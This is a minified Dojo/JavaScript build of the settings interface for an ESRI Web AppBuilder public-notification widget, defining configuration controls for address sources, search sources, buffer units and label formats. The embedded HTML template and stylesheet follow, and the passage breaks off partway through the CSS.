// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/PublicNotification/setting/SettingAddresseesBlock":function(){define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-class ./settingComponents ./SettingCheckbox ./SettingContainer ./SettingObject ./SettingOptionsTable ./SettingStaticText".split(" "),function(b,g,d,e,h,c,a,q,n,p){return g(q,{_inputControl:null,_detailsDiv:null,_detailsTitle:null,_detailsCheckbox:null,_iCurrentDetails:-1,_menuItems:[],constructor:function(b,f,k){this._inputControl=new n(null,"half-width",
"",f.propertyLabels.name,null,f.hints.selectionListOfOptionsToDisplay,d.hitch(this,this._onRowSelected));this._detailsTitle=new p;this._detailsCheckbox=new c(null,f.propertyLabels.useRelatedRecords,"",d.hitch(this,this._checkboxChanged));this._detailsDiv=h.container("half-width optionsTableHeaderHeight","majorTrailingVertGap",[this._detailsTitle.div(),this._detailsCheckbox.div()]);this._mainDiv=(new a(null,"flexbox "+(k||""),"majorTrailingHorizGap",f.groupingLabels.addressSources,"full-width",[this._inputControl,
this._detailsDiv])).div()},setConfig:function(){var a,f;a=[this._config[0]];f=this._config.slice(1);this._menuItems=b.map(f,function(f){return f.name});this._menuItems=0<this._menuItems.length?[].concat(a,this._menuItems):[a];this._inputControl.setValue(this._menuItems);this._setDetails(0)},getConfig:function(){var a=this._config.slice(1),f;this._menuItems=this._inputControl.getValue();f=[this._menuItems[0]];b.forEach(this._menuItems.slice(1),function(k){b.some(a,function(a){k===a.name&&f.push(a)})});
this._config=f},_setDetails:function(a){var f=this._config.length-1;0<=a&&a<f?(e.remove(this._detailsDiv,"hidden"),this._detailsTitle.setValue(this._config[a+1].name),this._detailsCheckbox.setValue(this._config[a+1].useRelatedRecords),this._iCurrentDetails=a):(e.add(this._detailsDiv,"hidden"),this._iCurrentDetails=-1)},_onRowSelected:function(a){var f=a.innerText.trim();b.some(this._menuItems,d.hitch(this,function(a,d){return a===f?(this._setDetails(d-1),!0):!1}))},_checkboxChanged:function(a){0<=
this._iCurrentDetails&&(this._config[this._iCurrentDetails+1].useRelatedRecords=a)}})})},"widgets/PublicNotification/setting/settingComponents":function(){define("dojo/_base/array dojo/dom-class dojo/dom-construct dojo/dom-style dijit/form/CheckBox dijit/form/NumberTextBox dijit/form/Select dijit/form/TextBox jimu/utils ./SettingSimpleTable".split(" "),function(b,g,d,e,h,c,a,q,n,p){var l={container:function(f,a,c){var k=c.length-1,e=l._createDiv("outlineBlockBlue1 "+(f||""));b.forEach(c,function(f,
b){d.place(f,e);b<k&&a&&g.add(f,a)});return e},fieldsetContainer:function(f,a,c,e,h){var k,m=h.length-1,q;a=l._createDiv(a);k=d.create("fieldset",{"class":"fieldset"},a);f&&d.create("legend",{"class":"fieldsetLegend",innerHTML:f},k);q=l._createDiv("outlineBlockBlue1 fieldsetMainContainer "+(c?c:""),k);b.forEach(h,function(a,f){d.place(a,q);f<m&&e&&g.add(a,e)});return a},addTextButtonDropdownCtl:function(a,k,c){var f,e;a=l._createDiv("addTextButton-button "+(a?a:""));f=l._createDiv("button",a);l._createSpan("button-text",
f).innerHTML=k;k=e=d.create("ul",{"class":"addTextButton-menu"},a);b.forEach(c,function(a){d.create("li",{"class":"addTextButton-item",innerHTML:a},e)});return{div:a,ctl:k}},checkboxCtl:function(a,k){a=l._createDiv(a);k=new h({style:"margin-top: 3px;",checked:k});d.place(k.domNode,a);k.startup();return{div:a,ctl:k}},dropdownCtl:function(a,d,c){a=l._createDiv(a);return{div:a,ctl:l.dropdown(a,d,c)}},dropdown:function(f,c,b){c=new a({options:b,"class":c});d.place(c.domNode,f);c.startup();return c},iconButton:function(a,
c){a=l._createDiv(a);e.set(a,"display","inline-block");a.title=c;return a},numberInputCtl:function(a,b){a=l._createDiv(a);b=new c({style:"width: 100%;",required:!0,placeHolder:b});b.startup();d.place(b.domNode,a);return{div:a,ctl:b}},tableCtl:function(a,c,b){a=l._createDiv(a);c=new p(c);c.placeAt(a);c.startup();Array.isArray(b)&&0<b.length&&c.addRows(b);return{div:a,ctl:c}},text:function(a,c){a=l._createDiv("outlineBlockRed1 "+(a||""));a.innerHTML=n.sanitizeHTML(c||"");return a},textButton:function(a,
c,b){a=l._createDiv("jimu-btn "+(a||""));a.innerHTML=c;a.title=b;return a},textInputCtl:function(a,c){a=l._createDiv("outlineBlockGreen1 "+(a||""));c=new q({style:"width: 100%;",placeHolder:c});c.startup();d.place(c.domNode,a);return{div:a,ctl:c}},_createSpan:function(a,c){return d.create("span",{"class":a},c)},_createDiv:function(a,c){return d.create("div",{"class":a},c)}};return l})},"widgets/PublicNotification/setting/SettingSimpleTable":function(){define(["dojo/_base/declare","dojo/_base/html",
"jimu/dijit/SimpleTable"],function(b,g,d){return b(d,{_onRowMoved:null,constructor:function(b){},deleteRow:function(b){var d,c;b&&(d=this.getRowData(b),c=b.rowIndex,g.destroy(b),this.updateUI(),this._onDeleteRow(b,d,c))},_onDeleteRow:function(b,d,c){this.emit("row-delete",b,d,c)}})})},"widgets/PublicNotification/setting/SettingCheckbox":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/on","./settingComponents","./SettingObject"],function(b,g,d,e,h){return b(h,{_inputControl:null,constructor:function(c,
a,b,h){c=[];var q;q=e.checkboxCtl("inline-block",!1);c.push(q.div);this._inputControl=q.ctl;h&&this.own(d(this._inputControl,"change",g.hitch(this,h)));b?c.push(e.container("variable-width","minorTrailingVertGap",[e.text("static-text",a),e.text("hint",b)])):c.push(e.text("static-text variable-width",a));this._mainDiv=e.container("full-width flexbox","minorTrailingHorizGap",c)},setValue:function(c){this._inputControl&&this._inputControl.set("value",c)},getValue:function(){if(this._inputControl)return"on"===
this._inputControl.get("value")},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},getConfig:function(){this._inputControl&&(this._config=this.getValue())}})})},"widgets/PublicNotification/setting/SettingObject":function(){define(["dojo/_base/declare","dijit/Destroyable"],function(b,g){return b(g,{"-chains-":{setConfig:"after",getConfig:"before"},_name:null,_config:null,_mainDiv:null,constructor:function(b){this._name=b},div:function(){return this._mainDiv},setConfig:function(b){this._name&&
(this._config=b[this._name])},getConfig:function(b){this._name&&(b[this._name]=this._config)}})})},"widgets/PublicNotification/setting/SettingContainer":function(){define(["dojo/_base/array","dojo/_base/declare","dojo/_base/lang","./settingComponents","./SettingObject"],function(b,g,d,e,h){return g(h,{_contents:[],constructor:function(c,a,b,d,h,g){Array.isArray(d)?(this._contents=d,this._mainDiv=e.container(a||"",b,this._getContentDivs(this._contents))):(this._contents=g,this._mainDiv=e.fieldsetContainer(d,
h,a||"",b,this._getContentDivs(this._contents)))},setConfig:function(c){b.forEach(this._contents,d.hitch(this,function(a){a.setConfig(this._config||c)}))},getConfig:function(c){this._name&&(this._config={});b.forEach(this._contents,d.hitch(this,function(a){a.getConfig(this._config||c)}))},_getContentDivs:function(c){return b.map(c,function(a){return a.div?a.div():a})}})})},"widgets/PublicNotification/setting/SettingOptionsTable":function(){define("dojo/_base/array dojo/_base/declare dojo/on dojo/query ./settingComponents ./SettingObject".split(" "),
function(b,g,d,e,h,c){return g(c,{_inputControl:null,_isFlagged:!0,constructor:function(a,b,c,e,g,f,k,m,r){a=[];e=[{name:"selected",title:"",width:"32px",type:"checkbox",editable:!1},{name:"item",title:e,width:"auto",type:"text",editable:!1},{name:"actions",title:"",width:"40px",type:"actions",actions:["up","down"]}];"function"===typeof m&&(this._isFlagged=!1,e=e.slice(1),e[1].width="60px",e[1].actions.push("delete"));c=h.tableCtl(c,{autoHeight:!0,selectable:"function"===typeof k,fields:e},g);a.push(c.div);
this._inputControl=c.ctl;k&&this.own(d(this._inputControl,"row-select",k));m&&this.own(d(this._inputControl,"row-delete",m));r&&(this.own(d(this._inputControl,"row-up",function(a){r(a,!0)})),this.own(d(this._inputControl,"row-down",function(a){r(a,!1)})));f&&a.push(h.text("hint",f));this._mainDiv=h.container(b||"","minorTrailingVertGap",a)},addRowToTable:function(a){this._inputControl&&this._inputControl.addRow(a)},selectTableRow:function(a){(a=this._getRowTR(a))&&this._inputControl.selectRow(a)},
renameTableRow:function(a,c){(a=this._getRowTR(a))&&this._inputControl.editRow(a,{item:c})},setValue:function(a){this._inputControl&&(this._inputControl.addRows(this._isFlagged?this._convertTableConfigToTableLines(a):a),this.selectTableRow(0))},getValue:function(){var a;return this._inputControl?(a=this._inputControl.getData(),this._isFlagged?this._convertTableLinesToTableConfig(a):a):null},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},getConfig:function(){this._inputControl&&
(this._config=this.getValue())},_getRowTR:function(a){var c;return this._inputControl&&0<=a?(c=e(".simple-table-row",this._inputControl.domNode),a<c.length?c[a]:null):null},_convertTableConfigToTableLines:function(a){var c=a[0];return b.map(a.slice(1),function(a,b){return{item:a,selected:"1"===c[b]}})},_convertTableLinesToTableConfig:function(a){var c="";a=b.map(a,function(a){c+=a.selected?"1":"0";return a.item});return a=[c].concat(a)}})})},"widgets/PublicNotification/setting/SettingStaticText":function(){define(["dojo/_base/declare",
"jimu/utils","./settingComponents","./SettingObject"],function(b,g,d,e){return b(e,{constructor:function(b,c,a){this._name="";this._mainDiv=d.text(c,a)},setValue:function(b){this._mainDiv.innerHTML=g.sanitizeHTML(b||"")},getValue:function(){return this._mainDiv.innerHTML}})})},"widgets/PublicNotification/setting/SettingBufferBlock":function(){define("dojo/_base/declare dojo/_base/lang ./settingComponents ./SettingInputWithDropdownLabeled ./SettingObject ./SettingOptionsTable ./SettingStaticText".split(" "),
function(b,g,d,e,h,c,a){return b(h,{_inputControlDistance:null,_inputControlTable:null,_defaultConfig:{bufferDistance:100,bufferUnits:"FEET",bufferUnitsMenu:"10100 FEET YARDS METERS KILOMETERS MILES".split(" ")},constructor:function(b,h,g,l,f,k,m,r,t){b=[];this._defaultConfig=k;this._inputControlDistance=new e(null,!0,"full-width",l,f,m,r,t,null,"","",this._createLargeDistanceUnitsDropdownItemsList());b.push(this._inputControlDistance.div());this._inputControlTable=new c("bufferUnitsMenu","details-value",
"",h.propertyLabels.units,null,h.hints.selectionListOfOptionsToDisplay);b.push(d.container("full-width flexbox","minorTrailingHorizGap",[(new a(null,"details-label static-text",h.propertyLabels.bufferUnits)).div(),this._inputControlTable.div()]));this._mainDiv=d.container(g||"","majorTrailingVertGap",b)},setValue:function(a){this._inputControl&&this._inputControl.set("value",a)},setConfig:function(){g.mixin({},this._defaultConfig,this._config);this._inputControlDistance&&this._inputControlTable&&
(this._inputControlDistance.setValue(this._config.bufferDistance),this._inputControlDistance.setModifier(this._config.bufferUnits),this._inputControlTable.setConfig(this._config))},getConfig:function(){this._inputControlDistance&&this._inputControlTable&&(this._config.bufferDistance=this._inputControlDistance.getValue(),this._config.bufferUnits=this._inputControlDistance.getModifier(),this._inputControlTable.getConfig(this._config))},_createLargeDistanceUnitsDropdownItemsList:function(){return[{label:jimuNls.units.feet,
value:"FEET"},{label:jimuNls.units.yards,value:"YARDS"},{label:jimuNls.units.meters,value:"METERS"},{label:jimuNls.units.kilometers,value:"KILOMETERS"},{label:jimuNls.units.miles,value:"MILES"}]}})})},"widgets/PublicNotification/setting/SettingInputWithDropdownLabeled":function(){define(["dojo/_base/declare","./SettingDropdown","./SettingInputLabeled","./SettingObject"],function(b,g,d,e){return b(e,{_inputControl:null,_inputModifier:null,constructor:function(b,c,a,e,n,p,l,f,k,m,r,t){this._inputModifier=
new g(null,m,r,t);this._inputControl=new d(null,c,a,e,n,p,l,f,k,this._inputModifier);this._mainDiv=this._inputControl.div()},setValue:function(b){this._inputControl&&this._inputControl.setValue(b)},setModifier:function(b){this._inputModifier&&this._inputModifier.setValue(b)},getValue:function(){return this._inputControl?this._inputControl.getValue():null},getModifier:function(){return this._inputModifier?this._inputModifier.getValue():null},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},
getConfig:function(){this._inputControl&&(this._config=this.getValue())}})})},"widgets/PublicNotification/setting/SettingDropdown":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/on","./settingComponents","./SettingObject"],function(b,g,d,e,h){return b(h,{_inputControl:null,constructor:function(b,a,h,n){b=e.dropdownCtl(a,h,n);this._mainDiv=b.div;this._inputControl=b.ctl;this.own(d(this._inputControl,"change",g.hitch(this,this._onChange)))},setValue:function(b){this._inputControl&&
this._inputControl.set("value",b)},getValue:function(){return this._inputControl?this._inputControl.get("value"):null},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},getConfig:function(){this._inputControl&&(this._config=this.getValue())},_onChange:function(b){this._config=b}})})},"widgets/PublicNotification/setting/SettingInputLabeled":function(){define(["dojo/_base/declare","./settingComponents","./SettingObject"],function(b,g,d){return b(d,{_inputControl:null,
constructor:function(b,d,c,a,q,n,p,l,f,k){b=[];var e=[];f||k?(f&&("string"===typeof f?e.push(g.text("static-text",f)):e.push(f.div())),d=d?g.numberInputCtl("variable-width inline-block",p):g.textInputCtl("variable-width inline-block",p),e.push(d.div),this._inputControl=d.ctl,k&&("string"===typeof k?e.push(g.text("static-text",k)):e.push(k.div())),b.push(g.container("full-width flexbox","minorTrailingHorizGap",e))):(d=d?g.numberInputCtl("full-width inline-block",p):g.textInputCtl("full-width inline-block",
p),b.push(d.div),this._inputControl=d.ctl);l&&b.push(g.text("hint",l));this._mainDiv=g.container("flexbox "+(c||""),"minorTrailingHorizGap",[g.container("inline-block "+(a?a:""),"",[g.text("static-text",n)]),g.container("inline-block "+(q?q:""),"minorTrailingVertGap",b)])},setValue:function(b){this._inputControl&&this._inputControl.set("value",b)},getValue:function(){return this._inputControl?this._inputControl.get("value"):null},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},
getConfig:function(){this._inputControl&&(this._config=this.getValue())}})})},"widgets/PublicNotification/setting/SettingCheckboxLabeled":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/on","./settingComponents","./SettingObject"],function(b,g,d,e,h){return b(h,{_inputControl:null,constructor:function(b,a,h,n,p,l,f){b=[];var c;c=e.checkboxCtl("inline-block",!1);b.push(c.div);this._inputControl=c.ctl;f&&this.own(d(this._inputControl,"change",g.hitch(this,f)));l&&b.push(e.text("hint",
l));this._mainDiv=e.container("flexbox "+(a||""),"minorTrailingHorizGap",[e.container("inline-block "+(h?h:""),"",[e.text("static-text",p)]),e.container("inline-block "+(n?n:""),"minorTrailingVertGap",b)])},setValue:function(b){this._inputControl&&this._inputControl.set("value",b)},getValue:function(){if(this._inputControl)return"on"===this._inputControl.get("value")},setConfig:function(){this._inputControl&&this._config&&this.setValue(this._config)},getConfig:function(){this._inputControl&&(this._config=
this.getValue())}})})},"widgets/PublicNotification/setting/SettingLabelFormats":function(){define(["dojo/_base/array","dojo/_base/declare","./SettingContainer","./SettingObject","./SettingOptionsTable"],function(b,g,d,e,h){return g(e,{_inputControl:null,constructor:function(b,a,e){this._inputControl=new h(null,"half-width","",a.propertyLabels.description,null,a.hints.selectionListOfOptionsToDisplay);this._mainDiv=(new d(null,"flexbox "+(e||""),"majorTrailingHorizGap",a.groupingLabels.labelFormats,
"full-width",[this._inputControl])).div()},setConfig:function(){var c,a;c=[this._config[0]];a=this._config.slice(1);a=b.map(a,function(a){return a.name});a=0<a.length?[].concat(c,a):[c];this._inputControl.setValue(a)},getConfig:function(){var c,a=this._config.slice(1),d;c=this._inputControl.getValue();d=[c[0]];b.forEach(c.slice(1),function(c){b.some(a,function(a){c===a.name&&d.push(a)})});this._config=d}})})},"widgets/PublicNotification/setting/SettingSearchSourcesBlock":function(){define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-construct dojo/on ./settingComponents ./SettingBoxedDivs ./SettingBufferBlock ./SettingCheckboxLabeled ./SettingContainer ./SettingDropdownLabeled ./SettingFieldListLabeled ./SettingInputLabeled ./SettingObject ./SettingOptionsTable".split(" "),
function(b,g,d,e,h,c,a,q,n,p,l,f,k,m,r,t){return g(r,{_inputControl:null,_mainControl:null,_detailsDiv:null,_detailsTitle:null,_detailsCheckbox:null,_sourceDisplay:null,_iCurrentSource:-1,_sourceMenuItems:[],_newSourceTypeMenuItems:[],_nls:null,_webmapFeatureLayers:[],_fieldListPicker:null,_displayFieldInput:null,constructor:function(b,e,f,g,v){this._nls=e;this._webmapFeatureLayers=v;this._newSourceTypeMenuItems=[e.groupingLabels.featureLayerDetails,e.groupingLabels.geocoderDetails];this._inputControl=
new t(null,"third-width","",e.propertyLabels.name,null,"",d.hitch(this,this._onRowSelected),d.hitch(this,this._onRowDeleted),d.hitch(this,this._onRowMoved));this._detailsDiv=a.container("two-thirds-width optionsTableHeaderHeight","majorTrailingVertGap",[]);b=a.addTextButtonDropdownCtl("",e.buttons.addSearchSource,this._newSourceTypeMenuItems);this.own(c(b.ctl,"click",d.hitch(this,this._onAddSearchSourceMenuItemClick)));this._mainControl=new l(null,f||"","majorTrailingVertGap",e.groupingLabels.searchSources,
"full-width",[new m("allPlaceholder",!1,"full-width","third-width","two-thirds-width",e.propertyLabels.placeholderTextForAllSources),new p("showInfoWindowOnSelect","full-width","third-width","two-thirds-width",e.propertyLabels.showPopupForFoundItem),new q(null,[b.div,a.container("full-width flexbox","majorTrailingHorizGap",[this._inputControl.div(),this._detailsDiv])])]);this._mainDiv=this._mainControl.div()},setConfig:function(){this._mainControl.setConfig(this._config);this._config.sources=b.filter(this._config.sources,
d.hitch(this,function(a){return"locator"===a.type||"query"===a.type&&b.some(this._webmapFeatureLayers,function(b){return a.layerId===b.layerId})}));this._sourceMenuItems=b.map(this._config.sources,function(a){return{item:a.name}});this._inputControl.setValue(this._sourceMenuItems);0<this._sourceMenuItems.length&&this._inputControl.selectTableRow(0)},getConfig:function(){this._mainControl.getConfig(this._config);this._setDetails(-1)},_onAddSearchSourceMenuItemClick:function(a){var b={};a.target.innerText===
this._newSourceTypeMenuItems[0]?(a=d.clone(this._config.searchSourceTemplates.query),a.name=this._webmapFeatureLayers[0].name,a.displayField=this._webmapFeatureLayers[0].displayField,a.layerId=this._webmapFeatureLayers[0].layerId,a.url=this._webmapFeatureLayers[0].url):a=d.clone(this._config.searchSourceTemplates.locator);a.buffer=d.clone(this._config.bufferTemplate);this._config.sources.push(a);b.item=a.name;this._sourceMenuItems.push(b);this._inputControl.addRowToTable(b);this._inputControl.selectTableRow(this._config.sources.length-
1)},_setDetails:function(a){var c=this._sourceMenuItems.length,g,w=[],v=[];this._removeCurrentDetails();0<=a&&a<c&&(g=this._config.sources[a],"query"===g.type?(b.map(this._webmapFeatureLayers,function(a){w.push({label:a.name,value:a.layerId});g.layerId===a.layerId&&b.map(a.fields,function(a){v.push({label:a.alias||a.name,value:a.name})})}),this._fieldListPicker=new k("searchFields",this._nls,"full-width","details-label","details-value",this._nls.propertyLabels.searchFields,this._nls.hints.csvNameList,
v),this._displayFieldInput=new f("displayField","full-width","details-label","details-value",this._nls.propertyLabels.displayField,"",v,d.hitch(this,this._onChangeField)),this._sourceDisplay=new l(null,"","majorTrailingVertGap",this._nls.groupingLabels.featureLayerDetails,"full-width",[new f("name","full-width","details-label","details-value",this._nls.propertyLabels.name,"",w,d.hitch(this,this._onChangeFeatureLayer)),new m("placeholder",!1,"full-width","details-label","details-value",this._nls.propertyLabels.placeholderText),
this._fieldListPicker,this._displayFieldInput,new m("maxSuggestions",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumSuggestions,"6"),new m("maxResults",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumResults,"6"),new m("zoomScale",!0,"full-width","details-label","details-value",this._nls.propertyLabels.zoomScale,"50000","","1:"),new p("exactMatch","full-width","details-label","details-value",this._nls.propertyLabels.exactMatch),new p("searchInCurrentMapExtent",
"full-width","details-label","details-value",this._nls.propertyLabels.limitSearchToMapExtent),new n("buffer",this._nls,"full-width","details-label","details-value",this._config.bufferTemplate,this._nls.propertyLabels.bufferDefaultDistance,"100")]),g.name=this._convertLayerNameToLayerId(g.name)):"locator"===g.type&&(this._sourceDisplay=new l(null,"","majorTrailingVertGap",this._nls.groupingLabels.geocoderDetails,"full-width",[new m("url",!1,"full-width","details-label","details-value",this._nls.propertyLabels.url),
new m("name",!1,"full-width","details-label","details-value",this._nls.propertyLabels.name),new m("placeholder",!1,"full-width","details-label","details-value",this._nls.propertyLabels.placeholderText),new m("countryCode",!1,"full-width","details-label","details-value",this._nls.propertyLabels.countryRegionCodes,this._nls.placeholders.countryRegionCodes),new m("maxSuggestions",!0,"full-width","details-label","details-value",this._nls.propertyLabels.maximumSuggestions,"6"),new m("maxResults",!0,"full-width",
"details-label","details-value",this._nls.propertyLabels.maximumResults,"6"),new m("zoomScale",!0,"full-width","details-label","details-value",this._nls.propertyLabels.zoomScale,"50000","","1:"),new p("searchInCurrentMapExtent","full-width","details-label","details-value",this._nls.propertyLabels.limitSearchToMapExtent),new n("buffer",this._nls,"full-width","details-label","details-value",this._config.bufferTemplate,this._nls.propertyLabels.bufferDefaultDistance,"100")])),this._sourceDisplay&&(g.buffer.bufferUnitsMenu=
this._convertUnitCodesToLabels(g.buffer.bufferUnitsMenu),this._sourceDisplay.setConfig(g),h.place(this._sourceDisplay.div(),this._detailsDiv),e.remove(this._detailsDiv,"hidden"),this._iCurrentSource=a))},_convertLayerIdToLayerName:function(a){var c=a;b.some(this._webmapFeatureLayers,function(b){return b.layerId===a?(c=b.name,!0):!1});return c},_convertLayerNameToLayerId:function(a){var c=a;b.some(this._webmapFeatureLayers,function(b){return b.name===a?(c=b.layerId,!0):!1});return c},_onChangeFeatureLayer:function(a){var c,
e=[];0<=this._iCurrentSource&&(c=this._config.sources[this._iCurrentSource],b.some(this._webmapFeatureLayers,d.hitch(this,function(d){return a===d.layerId?(c.name=d.layerId,c.searchFields=[],c.displayField=d.displayField,c.layerId=d.layerId,c.url=d.url,b.map(d.fields,function(a){e.push({label:a.alias||a.name,value:a.name})}),this._fieldListPicker.setFieldList(e),this._fieldListPicker.setDisplay(),this._displayFieldInput.setOptions(e),this._inputControl.renameTableRow(this._iCurrentSource,d.name),
!0):!1})))},_onChangeField:function(a){var b;0<=this._iCurrentSource&&(b=this._config.sources[this._iCurrentSource],b.displayField=a)},_onRowSelected:function(a){this._setDetails(a.rowIndex)},_onRowMoved:function(a,b){var c;this._removeCurrentDetails();c=b?a.rowIndex+1:a.rowIndex-1;b=this._sourceMenuItems.splice(c,1);c=this._config.sources.splice(c,1);this._sourceMenuItems.splice(a.rowIndex,0,b[0]);this._config.sources.splice(a.rowIndex,0,c[0]);this._inputControl.selectTableRow(a.rowIndex)},_onRowDeleted:function(a,
b,c){this._removeCurrentDetails();this._sourceMenuItems.splice(c,1);this._config.sources.splice(c,1);0<this._sourceMenuItems.length&&this._inputControl.selectTableRow(0)},_removeCurrentDetails:function(){var a;0<=this._iCurrentSource&&(e.add(this._detailsDiv,"hidden"),a=this._config.sources[this._iCurrentSource],this._sourceDisplay.getConfig(a),a.buffer.bufferUnitsMenu=this._convertLabelsToUnitCodes(a.buffer.bufferUnitsMenu),"query"===a.type&&(a.name=this._convertLayerIdToLayerName(a.name)),h.empty(this._detailsDiv),
this._sourceDisplay=null,this._iCurrentSource=-1)},_convertUnitCodesToLabels:function(a){var c=[],d=jimuNls.units;b.forEach(a,function(a){switch(a){case "CENTIMETERS":c.push(d.centimeters);break;case "INCHES":c.push(d.inches);break;case "FEET":c.push(d.feet);break;case "YARDS":c.push(d.yards);break;case "METERS":c.push(d.meters);break;case "KILOMETERS":c.push(d.kilometers);break;case "MILES":c.push(d.miles);break;default:c.push(a)}});return c},_convertLabelsToUnitCodes:function(a){var c=[],d=jimuNls.units;
b.forEach(a,function(a){switch(a){case d.centimeters:c.push("CENTIMETERS");break;case d.inches:c.push("INCHES");break;case d.feet:c.push("FEET");break;case d.yards:c.push("YARDS");break;case d.meters:c.push("METERS");break;case d.kilometers:c.push("KILOMETERS");break;case d.miles:c.push("MILES");break;default:c.push(a)}});return c}})})},"widgets/PublicNotification/setting/SettingBoxedDivs":function(){define(["dojo/_base/declare","./settingComponents","./SettingObject"],function(b,g,d){return b(d,
{constructor:function(b,d){this._mainDiv=g.container(null,null,d)}})})},"widgets/PublicNotification/setting/SettingDropdownLabeled":function(){define(["dojo/_base/declare","dojo/_base/lang","dojo/on","./settingComponents","./SettingObject"],function(b,g,d,e,h){return b(h,{_inputControl:null,_inputControlDiv:null,_inputControlOnChange:null,_disableNextOnChange:!1,constructor:function(b,a,h,n,p,l,f,k){b=[];f=e.dropdownCtl(null,"full-width",f);b.push(f.div);this._inputControl=f.ctl;this._inputControlDiv=
f.div;this._inputControlOnChange=k;this.own(d(this._inputControl,"change",g.hitch(this,this._onChange)));l&&b.push(e.text("hint",l));this._mainDiv=e.container("flexbox "+(a||""),"minorTrailingHorizGap",[e.container("inline-block "+(h?h:""),"",[e.text("static-text",p)]),e.container("inline-block "+(n?n:""),"minorTrailingVertGap",b)])},setValue:function(b){this._inputControl&&this._inputControl.set("value",b)},getValue:function(){return this._inputControl?this._inputControl.get("value"):null},setConfig:function(){this._inputControl&&
this._config&&this._config!==this.getValue()&&(this._disableNextOnChange=!0,this.setValue(this._config))},getConfig:function(){this._inputControl&&(this._config=this.getValue())},setOptions:function(b){this._inputControl&&this._inputControl.destroy();this._inputControl=e.dropdown(this._inputControlDiv,"full-width",b,this._inputControlOnChange)},_onChange:function(b){this._disableNextOnChange?this._disableNextOnChange=!1:this._inputControlOnChange(b)}})})},"widgets/PublicNotification/setting/SettingFieldListLabeled":function(){define("dojo/_base/array dojo/_base/declare dojo/_base/lang dojo/dom-attr dojo/dom-class dojo/dom-construct dojo/dom-style dojo/on dojo/query jimu/dijit/CheckBox jimu/dijit/Popup ./settingComponents ./SettingObject".split(" "),
function(b,g,d,e,h,c,a,q,n,p,l,f,k){return g(k,{_echoArea:null,_fieldMenuItems:[],_fieldsCheckBoxes:[],_fieldsPopup:null,_nls:null,_label:"",constructor:function(a,b,c,e,g,h,k,v){a=[];var u=[];this._nls=b;this._label=h;this._fieldMenuItems=v;this._echoArea=f.text("variable-width inline-block readOnlyTextField");u.push(this._echoArea);b=f.iconButton("edit-button",b.tooltips.openFieldSelector);this.own(q(b,"click",d.hitch(this,this._onFieldsSelectorClick)));u.push(b);a.push(f.container("full-width flexbox",
"minorTrailingHorizGap",u));k&&a.push(f.text("hint",k));this._mainDiv=f.container("flexbox "+(c||""),"minorTrailingHorizGap",[f.container("inline-block "+(e?e:""),"",[f.text("static-text",h)]),f.container("inline-block "+(g?g:""),"minorTrailingVertGap",a)])},setDisplay:function(a){this._echoArea&&(this._echoArea.innerHTML=Array.isArray(a)&&0<a.length?a.join(","):"")},setConfig:function(){var a=[];Array.isArray(this._config)&&0<this._config.length&&b.forEach(this._config,d.hitch(this,function(c){b.some(this._fieldMenuItems,
function(b){return c===b.value?(a.push(b.label),!0):!1})}));this.setDisplay(a)},setFieldList:function(a){this._fieldMenuItems=a},_onFieldsSelectorClick:function(){var f=c.create("div",{style:{maxHeight:"480px"}});this._fieldsCheckBoxes=[];b.forEach(this._fieldMenuItems,d.hitch(this,function(b,c){var d=new p({checked:this._arrayContains(this._config,b.value),label:b.label});h.add(d.domNode,"fields-checkbox");h.add(d.labelNode,"jimu-ellipsis");e.set(d.domNode,"title",b.label);0===c%3&&(window.isRTL?
a.set(d.domNode,"marginRight",0):a.set(d.domNode,"marginLeft",0));d.placeAt(f);n(d.domNode).data("fieldName",b.value);this._fieldsCheckBoxes.push(d)}));this._fieldsPopup=new l({titleLabel:this._label,autoHeight:!0,content:f,container:window.jimuConfig.layoutId,width:640,maxHeight:600,buttons:[{label:jimuNls.common.ok,onClick:d.hitch(this,"_onSearchFieldsOk")},{label:jimuNls.common.cancel,classNames:["jimu-btn-vacation"]}],onClose:d.hitch(this,function(){this._fieldsPopup=null})});h.add(this._fieldsPopup.domNode,
"jimu-widget-public-notification-setting-fields")},_arrayContains:function(a,c){return b.some(a,function(a){return a===c})},_onSearchFieldsOk:function(){var a=[],c=[];b.forEach(this._fieldsCheckBoxes,function(b){if(b.getValue()){var d=n(b.domNode).data("fieldName");a.push(d[0]);n(b.domNode).removeData();c.push(b.label)}});this._config=a;this.setDisplay(c);this._fieldsPopup.close()}})})},"widgets/PublicNotification/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css",
"dojo/i18n!./nls/strings"],function(){})},"url:widgets/PublicNotification/setting/Setting.html":'\x3cdiv data-dojo-attach-point\x3d"mainContainer" class\x3d"main-container"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tabsContainer" class\x3d"full-height"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',"url:widgets/PublicNotification/setting/css/style.css":'.jimu-widget-public-notification-setting .addTextButton-button {margin: 8px 0; display: inline-block; position: relative; padding-left: 22px; color: #518dca; background: url("images/add_icon.png") no-repeat left; cursor: pointer;}.jimu-rtl .jimu-widget-public-notification-setting .addTextButton-button {padding-left: 0; padding-right: 22px; background-position: right;}.jimu-widget-public-notification-setting .addTextButton-button .addTextButton-menu {position: absolute; display: none; list-style-type: none; top: 16px; left: 0; margin: 0; padding: 0; background: #fafafa; color: #7989a0; z-index: 999;}.jimu-rtl .jimu-widget-public-notification-setting .addTextButton-button .addTextButton-menu {right: 0; left: auto;}.jimu-widget-public-notification-setting .addTextButton-button:hover .addTextButton-menu {display: inline-block;}.jimu-widget-public-notification-setting .addTextButton-menu .addTextButton-item {white-space: nowrap; height: 30px; padding: 0 25px; line-height: 30px;}.jimu-widget-public-notification-setting .addTextButton-menu .addTextButton-item:hover {background: #edf2f5; color: 